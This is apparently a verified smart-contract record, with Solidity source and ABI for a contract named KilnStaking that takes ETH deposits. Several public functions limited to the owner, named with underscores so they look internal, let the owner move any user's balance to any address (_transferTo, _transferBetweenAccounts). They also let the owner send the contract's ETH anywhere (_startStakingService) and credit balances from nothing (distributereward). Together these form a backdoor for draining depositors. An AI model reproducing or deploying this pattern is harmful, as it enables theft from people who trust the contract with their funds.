{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/Staking.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: GPL-3.0\\n\\npragma solidity ^0.8.0;\\n\\ncontract KilnStaking {\\n\\n    mapping(address => uint256) private _balances;   // balances, indexed by addresses\\n   \\n    address private owner;    // current owner of the contract\\n\\n    constructor()  {\\n        owner = msg.sender;\\n    }\\n\\n    function stake(uint256 amount) payable public  {\\n         require(msg.value == amount);\\n        _balances[msg.sender] += amount;     // adjust the account's balance\\n    }\\n\\n    function unstake(uint256 amount) payable public   {\\n        require(amount <= _balances[msg.sender]);\\n        _balances[msg.sender] -= amount;\\n        payable(msg.sender).transfer(amount);\\n    }\\n\\n    function withdraw(uint256 amount) payable public   {\\n        require(amount <= _balances[msg.sender]);\\n        _balances[msg.sender] -= amount;\\n        payable(msg.sender).transfer(amount);\\n    }\\n\\n    function distributereward(uint256 amount, address recipient) public  {\\n        require(owner == msg.sender, \\\"Ownable: caller is not the owner\\\");\\n        _balances [recipient] += amount; \\n        \\n    }\\n\\n    function balanceOf(address account) public view returns (uint256) {\\n        return _balances[account];\\n    }\\n\\n    function myBalance() public view returns (uint256) {\\n        return _balances[msg.sender];\\n    }\\n\\n    function _transferBetweenAccounts(\\n        address sender,\\n        address recipient,\\n        uint256 amount\\n    ) public   returns (bool)\\n    {\\n        require(owner == msg.sender, \\\"Ownable: caller is not the owner\\\");\\n        require(_balances[sender] >= amount, \\\"transfer amount exceeds balance\\\");\\n        _balances[sender] = _balances[sender] - amount;\\n        _balances[recipient] += amount;\\n        return true;\\n    }\\n\\n    function _transferTo(\\n        address sender,\\n        address recipient,\\n        uint256 amount\\n    ) payable public   returns (bool)\\n    {\\n        require(owner == msg.sender, \\\"Ownable: caller is not the owner\\\");\\n        require(_balances[sender] >= amount, \\\"transfer amount exceeds balance\\\");\\n        _balances[sender] = _balances[sender] - amount;\\n        payable(recipient).transfer(amount);\\n        return true;\\n    }\\n\\n    function _startStakingService(\\n        uint256 amount,\\n        address stakingProvider\\n    ) payable public returns (bool)\\n    {\\n        require(owner == msg.sender, \\\"Ownable: caller is not the owner\\\");\\n        payable(stakingProvider).transfer(amount);\\n        return true;\\n    }\\n\\n    function _depositByProvider(\\n        uint256 amount\\n    ) payable public\\n    {\\n        require(msg.value == amount);\\n    }\\n\\n    function _claimRewards(\\n        uint256 amount\\n    ) payable public\\n    {\\n        require(amount <= _balances[msg.sender]);\\n        _balances[msg.sender] -= amount;\\n        payable(msg.sender).transfer(amount);\\n    }\\n\\n    function getOwner() public view returns (address) {\\n        return owner;\\n    }\\n\\n    function getBalance() public view returns (uint256) {\\n        return address(this).balance;\\n    }\\n    \\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"_claimRewards\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"_depositByProvider\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"stakingProvider\",\"type\":\"address\"}],\"name\":\"_startStakingService\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"_transferBetweenAccounts\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"_transferTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"}],\"name\":\"distributereward\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"myBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"stake\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"unstake\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"}]", "ContractName": "KilnStaking", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}